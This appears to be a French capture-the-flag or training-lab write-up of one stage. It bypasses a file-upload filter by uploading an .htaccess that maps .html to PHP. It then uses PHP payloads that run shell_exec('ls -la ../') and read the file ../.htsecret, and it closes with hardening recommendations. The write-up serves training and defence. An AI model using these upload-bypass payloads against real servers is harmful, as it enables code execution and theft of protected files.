# Étape 10 — Ushuaia

## Objectif
Lire le fichier `.htsecret`.

## Faille / Catégorie OWASP
**Code Injection**

## Démarche d'exploitation
Le site propose un formulaire d'upload de fichiers vers un répertoire `Docs` accessible, mais bloque l'extension `.php`.

**Contournement via `.htaccess` :**

1. Création d'un fichier `.htaccess` contenant :
   ```
   AddType application/x-httpd-php .html
   ```
   Cette directive fait passer les fichiers `.html` pour du PHP, permettant l'exécution de code PHP.

2. Upload du `.htaccess` dans le répertoire `Docs`

3. Upload d'un fichier `.html` contenant du code PHP pour lister le répertoire parent :
   ```php
   <?php echo shell_exec('ls -la ../'); ?>
   ```

4. Lecture du fichier `.htsecret` :
   ```php
   <?php echo file_get_contents('../.htsecret'); ?>
   ```

## Recommandations
- Désactiver l'utilisation de fichiers `.htaccess` via la directive `AllowOverride None` sous Apache
- Désactiver la directive `AddType` dans la configuration serveur
- Utiliser une liste blanche des extensions de fichiers autorisées
- Ajouter les fonctions shell (`shell_exec`, `exec`, etc.) dans `disable_functions` dans `php.ini`
- Valider les fichiers côté serveur sur la base du type MIME, pas uniquement de l'extension

## Certificat
`8f02bccfbb6a73954dbeef8b9102ee41dce6e09ad3f0cfa5790bcb61061c03d3febe02352d5bdec6`
